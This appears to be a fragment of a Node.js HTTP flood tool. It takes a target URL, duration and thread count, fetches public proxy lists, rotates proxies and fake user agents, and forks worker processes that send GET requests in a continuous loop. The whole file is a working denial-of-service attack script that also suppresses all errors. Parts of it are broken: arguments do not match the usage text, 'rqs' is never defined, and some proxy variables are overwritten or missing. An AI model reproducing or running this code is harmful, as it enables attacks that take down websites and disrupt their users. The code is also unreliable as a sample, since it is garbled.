path = require('path'),
script_name = path.basename(__filename),
request = require('request'),
axios = require("axios"),
fs = require('fs'),
fakeUa = require('fake-useragent'),
fakeRef = require('random-referer'),
cluster = require('cluster');

async function main_process() {

    if (process.argv.length !== 6) {

        console.log(`\x1b[91mUsage: node ${script_name} {target_url} {flood_time} {cpu_thread} flood_type {delay} {request_per_ip} \x1b[0m`);

        process.exit(0);

    }else{

        const target = process.argv[2];
        const times = process.argv[3];
        const threads = process.argv[4];

        Array.prototype.remove_by_value = function(val) {

            for (var i = 0; i < this.length; i++) {

            if (this[i] === val) {

                this.splice(i, 1);

                i--;

            }

            }

            return this;

        }

        if (process.argv[5] == 'bypass') {

            console.log("HTTP_BYPASS: "+ target)

        } else if (process.argv[5] == 'proxy'){

            console.log("HTTP_PROXY: "+ target)

            const proxyscrape_http = await axios.get('https://api.proxyscrape.com/v2/?request=getproxies&protocol=http&timeout=10000&country=all&ssl=all&anonymity=all');
            const proxy_list_http = await axios.get('https://www.proxy-list.download/api/v1/get?type=http');
            const raw_github_http = await axios.get('https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/http.txt');

            var proxies = proxyscrape_http.data.replace(/\r/g, '').split('\n');
            var proxies = proxy_list_http.data.replace(/\r/g, '').split('\n');
            var proxies = raw_github_http.data.replace(/\r/g, '').split('\n');

        } else {

            console.log("HTTP_PROXY: "+ target)
            var proxies = fs.readFileSync(process.argv[5], 'utf-8').replace(/\r/g, '').split('\n');
            var proxies = proxyscrape_http.data.replace(/\r/g, '').split('\n');
            var proxies = proxy_list_http.data.replace(/\r/g, '').split('\n');
            var proxies = raw_github_http.data.replace(/\r/g, '').split('\n');

        }

        function run() {

            if (process.argv[5] !== 'bypass') {
                var proxy = proxies[Math.floor(Math.random() * proxies.length)];
                var proxiedRequest = request.defaults({'proxy': 'http://'+proxy});
                var config = {
                    method: 'get',
                    url: target,
                    headers: {
                        'Cache-Control': 'no-cache',
                        'Connection': 'keep-alive',
                        'User-Agent': fakeUa()
                    }
                };

                proxiedRequest(config, function (error, response) {

                    console.log("HTTP_PROXY: "+ response.statusCode);
                    if (proxies.length == 0) {
                        process.exit(0);

                    }

                    if (response.statusCode >= 200 && response.statusCode <= 226) {
                        for (let index = 0; index < rqs; index++) {
                            proxiedRequest(config);
                        }
                    }else{
                        proxies = proxies.remove_by_value(proxy)
                    }
                });
            } else {
                var config = {
                    method: 'get',
                    url: target,
                    headers: {
                        'Cache-Control': 'no-cache',
                        'Connection': 'keep-alive',
                        'User-Agent': fakeUa()
                    }
                };
                request(config, function (error, response) {
                    console.log("HTTP_BYPASS: "+ response.statusCode);

                });



                //console.log(`Bypassing request sent. - CatBypass`)

            }

        }

        function thread(){

            setInterval(() => {

                run();

            });

        }

        async function main(){

                if (cluster.isMaster) {

                        for (let i = 0; i < threads; i++) {

                            cluster.fork();

                            //console.log(`Cat bypass - Total bypassing request: ${i+1}`);

                        }

                        //console.log(`Cat bypass - Total bypassing request`)

                    cluster.on('exit', function(){

                        cluster.fork();

                    });

                } else {

                    thread();

                }

        }

        main();

        setTimeout(() => {

        console.log('Attack End');

        process.exit(0)

        },times * 1000);

    }

}

process.on('uncaughtException', function (err) {

});

process.on('unhandledRejection', function (err) {

});

main_process();
